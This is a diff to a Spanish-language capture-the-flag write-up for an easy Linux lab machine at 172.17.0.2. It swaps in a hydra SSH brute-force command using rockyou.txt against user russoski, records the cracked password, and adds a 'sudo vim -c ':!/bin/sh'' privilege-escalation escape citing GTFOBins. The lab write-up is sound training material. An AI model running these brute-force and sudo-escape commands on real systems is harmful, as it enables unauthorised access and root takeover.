@@ -7,7 +7,7 @@ Dificultad: Muy fácil
 tags:
   - maquina
   - fuerza_bruta
-  - analisis_imagen
+  - escala_privs
   - linux
 ---
 ## Reconocimiento
@@ -52,17 +52,17 @@ Ahora ya sabemos que el usuario que utiliza es russoski.
 
 4. **Acceso al SSH por Fuerza Bruta**:
 
-Con el usuario borazuwarah, vamos a intentar hacer un ataque de hydra para poder acceder al SSH
+Con el usuario russoski, vamos a intentar hacer un ataque de hydra para poder acceder al SSH
 
 ```bash 
-hydra -l borazuwarah -P /home/alejandro/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt  ssh://172.17.0.2 
+hydra -l russoski -P /home/alejandro/wordlists/rockyou.txt -t 5 -vvv ssh://172.17.0.2
 ```
 
-![[Pasted image 20241019154043.png]]
+![[Pasted image 20241022102036.png]]
 
-Listo, ya sabemos la contraseña del usuario borazuwarah -> 123456
+Listo, ya sabemos la contraseña del usuario russoski -> iloveme
 
-![[Pasted image 20241019154520.png]]
+![[Pasted image 20241022102236.png]]
 
 Una vez dentro ya podemos pasar a la escala de privilegios.
 
@@ -74,12 +74,14 @@ Para ver los permisos que tenemos con el comando sudo podemos ejecutar:
 sudo -l
 ```
 
-![[Pasted image 20241019154627.png]]
+![[Pasted image 20241022102302.png]]
 
-Como podemos apreciar se puede ejecutar /bin/bash como sudo.... Así que vamos a ejecutarlo.
+Como podemos apreciar se puede ejecutar /usr/bin/vim como sudo.... Así que vamos a ir a la web de gtfobins para ver que comando podemos ejecutar link -> https://gtfobins.github.io/.
 
 ```bash 
-sudo /bin/bash
+sudo vim -c ':!/bin/sh'
 ```
 
-![[Pasted image 20241019154727.png]]
+![[Pasted image 20241022102441.png]]
+
+Y ya tendríamos privilegios de root.
